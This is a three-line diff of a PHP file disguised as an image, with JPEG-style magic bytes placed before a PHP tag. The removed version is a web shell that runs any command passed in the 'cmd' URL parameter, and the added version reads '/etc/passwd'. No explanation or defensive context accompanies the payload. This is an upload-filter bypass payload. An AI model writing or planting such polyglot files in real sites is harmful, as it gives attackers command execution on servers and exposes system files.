@@ -1,3 +1,3 @@
-ï¿½ï¿½ï¿½ï¿½<?php
-echo system($_GET["cmd"]);
+ÿØÿî<?php
+system("cat /etc/passwd")
 ?>
